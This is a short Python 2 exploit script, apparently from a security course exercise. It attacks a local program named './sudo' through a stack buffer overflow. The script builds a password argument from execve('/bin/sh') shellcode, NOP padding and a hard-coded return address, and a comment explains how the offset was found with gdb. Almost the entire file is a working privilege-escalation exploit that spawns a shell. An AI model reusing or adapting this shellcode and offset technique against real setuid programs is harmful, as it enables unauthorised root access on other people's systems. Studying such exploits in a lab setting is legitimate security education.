import os, sys, subprocess

PATH_TO_SUDO = './sudo'


def run_shell():
	# the shell code itself - doesn't contain 0x00
	assembler_password = '\xeb\x161\xc01\xc91\xd2[1\xff\x89\xdf\x83\xc7\x07\x89\x0f1\xc0\xb0\x0b\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh@'
	cmd = "pwd"# arbitrary, just used to follow the proper usage of the program
	nop = '\x90' * (67 - len(assembler_password)) # add NOPs complete to exactly 67 bytes long password
	shell_code_address = '\x69\xe0\xff\xbf' # Add begining of shell code address on stack, notic little endian
	password = assembler_password + nop + shell_code_address
	'''
	using core analysis with gdb:
	segmentation fault occurred at address 0x0804007a, which is exactly the value of EIP register
	analyzing further we see that the address (on stack) that contains this value is 0xbfffe0ac
	so this is where RET value is stored on stack.
	next, we see that our shell code (AAAAAAA...) starts exactly on address 0xbfffe069.
	so this is where we would like to jump.
	calculating, (altough already done in section a) the difference between the addresses is 67 bytes.
	so our shell code has to be 67 bytes, then add the address in little endian.
	so we will add NOPs to complete to exactly 67 bytes.
	'''
	subprocess.call([PATH_TO_SUDO, password, cmd])
	return


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
